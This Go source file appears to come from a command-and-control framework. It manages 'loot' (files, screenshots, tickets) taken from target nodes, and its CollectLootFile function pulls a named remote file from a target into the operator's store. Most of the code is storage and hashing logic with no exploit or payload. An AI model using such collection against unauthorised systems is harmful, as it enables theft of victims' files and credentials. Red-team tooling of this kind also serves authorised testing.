package process

import (
	"context"
	"crypto/sha256"
	"encoding/hex"
	"fmt"
	"io"
	"mime"
	"path"
	"strings"
	"time"

	"codeberg.org/agnoie/shepherd/pkg/utils"
)

// LootCategory 标记战利品类型。
type LootCategory string

const (
	LootCategoryFile       LootCategory = "file"
	LootCategoryScreenshot LootCategory = "screenshot"
	LootCategoryTicket     LootCategory = "ticket"
)

// LootRecord 描述一条 loot 记录的核心信息。
type LootRecord struct {
	ID         string
	TargetUUID string
	Operator   string
	Category   LootCategory
	Name       string
	StorageRef string
	OriginPath string
	Hash       string
	Size       uint64
	Mime       string
	Metadata   map[string]string
	Tags       []string
	CreatedAt  time.Time
}

// LootFilter 用于查询过滤。
type LootFilter struct {
	TargetUUID string
	Category   LootCategory
	Limit      int
	BeforeID   string
	Tags       []string
}

// LootPersistence 抽象底层持久化接口，便于 sqlite 等实现。
type LootPersistence interface {
	SaveLoot(rec LootRecord) error
	ListLoot(filter LootFilter) ([]LootRecord, error)
	GetLoot(lootID string) (LootRecord, error)
}

// LootContentStore 提供 loot 内容落盘接口。
type LootContentStore interface {
	Store(lootID string, data []byte, mime string) (storageRef string, size uint64, hash string, err error)
	StoreStream(lootID string, r io.Reader, mime string) (storageRef string, size uint64, hash string, err error)
	Open(storageRef string) (io.ReadCloser, uint64, error)
}

// SubmitLoot 在 Kelpie 管理端记录一条 loot 事件。
// 若未配置持久化实现，则静默忽略。
func (admin *Admin) SubmitLoot(rec LootRecord, content []byte) (LootRecord, error) {
	if admin == nil || admin.lootStore == nil {
		return rec, nil
	}
	if rec.ID == "" {
		rec.ID = utils.GenerateUUID()
	}
	if rec.CreatedAt.IsZero() {
		rec.CreatedAt = time.Now().UTC()
	}
	if rec.Category == "" {
		rec.Category = LootCategoryFile
	}
	if rec.TargetUUID == "" {
		return rec, fmt.Errorf("loot target uuid missing")
	}
	rec.Tags = normalizeTags(rec.Tags)
	if rec.Metadata == nil {
		rec.Metadata = map[string]string{}
	}
	// 如提供内容，优先落盘并计算 hash/size。
	if len(content) > 0 {
		if admin.lootContentStore != nil {
			if storageRef, size, hash, err := admin.lootContentStore.Store(rec.ID, content, rec.Mime); err != nil {
				return rec, fmt.Errorf("store loot content: %w", err)
			} else {
				rec.StorageRef = storageRef
				if rec.Size == 0 {
					rec.Size = size
				}
				if rec.Hash == "" {
					rec.Hash = hash
				}
			}
		} else if rec.Size == 0 {
			rec.Size = uint64(len(content))
		}
	}
	if rec.Size == 0 && len(content) > 0 {
		rec.Size = uint64(len(content))
	}
	if rec.Hash == "" && len(content) > 0 {
		sum := sha256.Sum256(content)
		rec.Hash = hex.EncodeToString(sum[:])
	}
	if err := admin.lootStore.SaveLoot(rec); err != nil {
		return rec, err
	}
	return rec, nil
}

// ListLoot 返回最近的 loot 记录，用于后续 UI/调试。
func (admin *Admin) ListLoot(filter LootFilter) []LootRecord {
	if admin == nil || admin.lootStore == nil {
		return nil
	}
	if filter.Limit <= 0 {
		filter.Limit = 50
	}
	records, err := admin.lootStore.ListLoot(filter)
	if err != nil {
		return nil
	}
	return records
}

// GetLoot 返回指定 loot 记录。
func (admin *Admin) GetLoot(lootID string) (LootRecord, error) {
	if admin == nil || admin.lootStore == nil {
		return LootRecord{}, fmt.Errorf("loot store unavailable")
	}
	return admin.lootStore.GetLoot(strings.TrimSpace(lootID))
}

// OpenLootContent 以流式方式打开 loot 内容，用于导出/同步到本地。
func (admin *Admin) OpenLootContent(lootID string) (LootRecord, io.ReadCloser, uint64, error) {
	rec, err := admin.GetLoot(lootID)
	if err != nil {
		return LootRecord{}, nil, 0, err
	}
	if strings.TrimSpace(rec.StorageRef) == "" || admin == nil || admin.lootContentStore == nil {
		return rec, nil, 0, nil
	}
	reader, size, err := admin.lootContentStore.Open(rec.StorageRef)
	if err != nil {
		return rec, nil, 0, fmt.Errorf("open loot content: %w", err)
	}
	return rec, reader, size, nil
}

// CollectLootFile 让 Kelpie 直接向目标节点发起 file-get，并将结果落到服务端 Loot 仓。
func (admin *Admin) CollectLootFile(ctx context.Context, targetUUID, remotePath, operator string, tags []string) (LootRecord, error) {
	if admin == nil || admin.lootStore == nil {
		return LootRecord{}, fmt.Errorf("loot store unavailable")
	}
	if admin.lootContentStore == nil {
		return LootRecord{}, fmt.Errorf("loot content store unavailable")
	}
	targetUUID = strings.TrimSpace(targetUUID)
	remotePath = strings.TrimSpace(remotePath)
	if targetUUID == "" {
		return LootRecord{}, fmt.Errorf("target uuid required")
	}
	if remotePath == "" {
		return LootRecord{}, fmt.Errorf("remote path required")
	}
	name := lootNameFromPath(remotePath)
	guessedMime := mime.TypeByExtension(strings.ToLower(path.Ext(name)))
	streamHandle, err := admin.OpenStream(ctx, targetUUID, "", map[string]string{
		"kind": "file-get",
		"path": remotePath,
	})
	if err != nil {
		return LootRecord{}, fmt.Errorf("open remote file stream: %w", err)
	}
	defer streamHandle.Close()

	rec := LootRecord{
		ID:         utils.GenerateUUID(),
		TargetUUID: targetUUID,
		Operator:   strings.TrimSpace(operator),
		Category:   LootCategoryFile,
		Name:       name,
		OriginPath: remotePath,
		Mime:       guessedMime,
		Tags:       normalizeTags(tags),
		CreatedAt:  time.Now().UTC(),
	}
	storageRef, size, hash, err := admin.lootContentStore.StoreStream(rec.ID, streamHandle, rec.Mime)
	if err != nil {
		return LootRecord{}, fmt.Errorf("store collected loot: %w", err)
	}
	rec.StorageRef = storageRef
	rec.Size = size
	rec.Hash = hash

	if streamID := streamHandleID(streamHandle); streamID != 0 {
		reason := admin.StreamCloseReason(streamID)
		if reason != "" && !streamCloseSucceeded(reason) {
			return LootRecord{}, fmt.Errorf("remote file transfer failed: %s", reason)
		}
		if parsed := parseStreamReason(reason); parsed != nil {
			if parsed.size > 0 {
				rec.Size = uint64(parsed.size)
			}
			if parsed.hash != "" {
				rec.Hash = parsed.hash
			}
			if parsed.mime != "" {
				rec.Mime = parsed.mime
			}
		}
	}

	saved, err := admin.SubmitLoot(rec, nil)
	if err != nil {
		return LootRecord{}, err
	}
	return saved, nil
}

func lootNameFromPath(remotePath string) string {
	normalized := strings.ReplaceAll(strings.TrimSpace(remotePath), "\\", "/")
	name := strings.TrimSpace(path.Base(normalized))
	if name == "" || name == "." || name == "/" {
		return "remote-file"
	}
	return name
}

func streamHandleID(handle io.ReadWriteCloser) uint32 {
	type streamIDProvider interface {
		ID() uint32
	}
	if provider, ok := handle.(streamIDProvider); ok {
		return provider.ID()
	}
	return 0
}

func streamCloseSucceeded(reason string) bool {
	reason = strings.TrimSpace(strings.ToLower(reason))
	return reason == "ok" || strings.HasPrefix(reason, "ok ")
}

func normalizeTags(tags []string) []string {
	var result []string
	seen := make(map[string]struct{})
	for _, t := range tags {
		t = strings.TrimSpace(strings.ToLower(t))
		if t == "" {
			continue
		}
		if _, ok := seen[t]; ok {
			continue
		}
		seen[t] = struct{}{}
		result = append(result, t)
	}
	return result
}
